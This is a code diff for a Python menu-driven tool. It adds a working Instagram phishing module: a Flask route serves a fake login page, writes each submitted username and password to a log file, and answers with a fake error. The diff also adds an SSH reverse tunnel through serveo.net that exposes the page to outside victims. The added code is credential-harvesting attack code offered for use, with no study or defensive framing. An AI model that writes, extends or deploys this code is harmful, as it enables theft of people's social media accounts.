@@ -5,6 +5,15 @@ import requests
 import subprocess
 from termcolor import colored
 from pyfiglet import figlet_format
+from flask import Flask, request, render_template
+from werkzeug.serving import run_simple
+
+app = Flask(__name__)
+log_dir = 'Log'
+log_file = os.path.join(log_dir, 'instagram_log.txt')
+
+if not os.path.exists(log_dir):
+    os.makedirs(log_dir)
 
 def clear_screen():
     if os.name == 'nt':
@@ -32,6 +41,69 @@ def check_for_updates():
     except Exception as e:
         print(colored(f"[-] Update check failed: {e}", 'red', attrs=['bold']))
 
+@app.route('/instagramlogin', methods=['GET', 'POST'])
+def instagram_login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        with open(log_file, 'a') as f:
+            f.write(f'Instagram Username: {username}, Password: {password}\n')
+        print(colored(f'[+] Instagram user credentials saved: {username}, {password}', 'green', attrs=['bold']))
+        return 'An error occurred, please try again', 200
+    return render_template('instagram.html')
+
+def start_server(port):
+    url = f'http://127.0.0.1:{port}/instagramlogin'
+    print(colored(f"[+] Target URL --> {url}", 'yellow', attrs=['bold']))
+    print(colored("[+] Waiting for target credentials...", 'green', attrs=['bold']))
+    run_simple('0.0.0.0', port, app, use_reloader=False, use_debugger=False)
+
+def start_serveo_tunnel(port):
+    print(colored("[!] Starting Serveo tunnel...", 'yellow', attrs=['bold']))
+    try:
+        result = subprocess.run(
+            ["ssh", "-R", f"80:localhost:{port}", "serveo.net"],
+            check=True,
+            capture_output=True,
+            text=True
+        )
+        serveo_url = None
+        for line in result.stdout.splitlines():
+            if "https://" in line:
+                serveo_url = line.strip()
+                break
+        if serveo_url:
+            print(colored(f"[+] Serveo tunnel established. URL: {serveo_url}", 'green', attrs=['bold']))
+        else:
+            print(colored("[-] Could not retrieve Serveo URL.", 'red', attrs=['bold']))
+    except subprocess.CalledProcessError:
+        print(colored("[-] Failed to start Serveo tunnel.", 'red', attrs=['bold']))
+
+def instagram_login_menu():
+    clear_screen()
+    display_logo()
+    print(colored("=" * 50, 'yellow', attrs=['bold']))
+    print(colored("              [01] Localhost", 'cyan', attrs=['bold']))
+    print(colored("              [02] Serveo", 'cyan', attrs=['bold']))
+    print(colored("              [00] Back", 'red', attrs=['bold']))
+    print(colored("=" * 50, 'yellow', attrs=['bold']))
+    print("\n")
+
+    choice = input(colored("Select an option: ", 'cyan', attrs=['bold']))
+
+    if choice == '01':
+        port = input(colored("Enter the port to use: ", 'cyan', attrs=['bold']))
+        start_server(int(port))
+    elif choice == '02':
+        port = input(colored("Enter the port to use for Serveo: ", 'cyan', attrs=['bold']))
+        start_serveo_tunnel(port)
+    elif choice == '00':
+        return
+    else:
+        print(colored("[-] Invalid option. Please try again.", 'red', attrs=['bold']))
+        time.sleep(1)
+        instagram_login_menu()
+
 def display_main_menu():
     print(colored("=" * 50, 'yellow', attrs=['bold']))
     print(colored("              [01] Instagram Login", 'cyan', attrs=['bold']))
@@ -41,14 +113,14 @@ def display_main_menu():
 
 def main_menu():
     clear_screen()
-    display_logo()
     check_for_updates()
+    display_logo()
     while True:
         display_main_menu()
         choice = input(colored("Select an option: ", 'cyan', attrs=['bold']))
-        
+
         if choice == '01':
-            pass
+            instagram_login_menu()
         elif choice == '00':
             print(colored("[!] Thank you for using our tool! Goodbye.", 'yellow', attrs=['bold']))
             sys.exit()
